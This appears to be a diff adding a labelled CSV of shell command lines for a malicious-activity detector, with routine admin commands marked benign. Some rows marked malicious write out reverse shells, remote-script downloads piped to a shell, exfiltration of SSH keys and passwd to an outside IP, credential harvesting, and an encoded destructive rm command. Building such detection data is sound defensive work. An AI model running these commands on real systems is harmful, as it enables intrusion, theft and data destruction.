@@ -1,0 +1,70 @@
+process_name,command_line,label
+ls,ls -la /home/deploy,benign
+cat,cat /etc/os-release,benign
+git,git pull origin main,benign
+git,git commit -am "fix: handle nil pointer",benign
+go,go build ./...,benign
+go,go test ./... -run TestAuth,benign
+npm,npm install --save express,benign
+node,node server.js --port 8080,benign
+python3,python3 -m venv .venv,benign
+python3,python3 manage.py migrate,benign
+pip3,pip3 install -r requirements.txt,benign
+docker,docker compose up -d,benign
+docker,docker ps --format '{{.Names}}',benign
+kubectl,kubectl get pods -n prod,benign
+systemctl,systemctl restart nginx,benign
+systemctl,systemctl status sshd,benign
+journalctl,journalctl -u nginx --since today,benign
+apt-get,apt-get update,benign
+apt-get,apt-get install -y htop,benign
+grep,grep -rn TODO ./src,benign
+find,find /var/log -name '*.log' -mtime -1,benign
+awk,awk '{print $1}' /var/log/access.log,benign
+sed,sed -i 's/debug/info/' config.yaml,benign
+ps,ps aux --sort=-%cpu,benign
+top,top -bn1,benign
+df,df -h,benign
+free,free -m,benign
+ssh,ssh deploy@10.0.0.5 uptime,benign
+scp,scp ./build.tar.gz deploy@10.0.0.5:/srv/releases/,benign
+rsync,rsync -avz ./dist/ deploy@10.0.0.5:/var/www/,benign
+curl,curl -fsSL https://api.github.com/repos/cilium/ebpf,benign
+curl,curl -s http://localhost:9090/metrics,benign
+wget,wget -q https://golang.org/dl/go1.21.linux-amd64.tar.gz,benign
+tar,tar xzf go1.21.linux-amd64.tar.gz -C /usr/local,benign
+tar,tar czf /home/deploy/backup.tgz /home/deploy/project,benign
+chmod,chmod +x ./scripts/deploy.sh,benign
+chmod,chmod 644 /etc/nginx/nginx.conf,benign
+nc,nc -zv localhost 5432,benign
+openssl,openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem,benign
+crontab,crontab -l,benign
+cp,cp /etc/hosts /home/deploy/hosts.bak,benign
+mv,mv /tmp/upload.bin /srv/data/upload.bin,benign
+mkdir,mkdir -p /srv/releases/2026-06,benign
+whoami,whoami,benign
+id,id deploy,benign
+hostname,hostname -f,benign
+uname,uname -a,benign
+env,env,benign
+history,history,benign
+ip,ip addr show,benign
+uptime,uptime,benign
+date,date -u +%s,benign
+echo,echo deploying release,benign
+which,which python3,benign
+bash,bash -c "echo build complete",benign
+nmap,nmap -sn 10.0.0.0/24,malicious
+nmap,nmap -p- -T4 10.0.0.5,malicious
+cat,cat /etc/shadow,malicious
+grep,grep -r password /home,malicious
+find,find / -perm -4000 -type f 2>/dev/null,malicious
+tar,tar czf /tmp/loot.tgz /home/deploy/.ssh /etc/passwd,malicious
+chmod,chmod +x /tmp/.implant,malicious
+curl,curl -fsSL http://185.220.101.7/stage2.sh | sh,malicious
+bash,bash -i >& /dev/tcp/185.220.101.7/4444 0>&1,malicious
+nc,nc -e /bin/sh 185.220.101.7 9001,malicious
+python3,python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('185.220.101.7',4444))",malicious
+scp,scp /tmp/loot.tgz attacker@185.220.101.7:/exfil/,malicious
+wget,wget -qO- http://185.220.101.7/p.sh | bash,malicious
+echo,echo c3VkbyBybSAtcmYK | base64 -d | bash,malicious
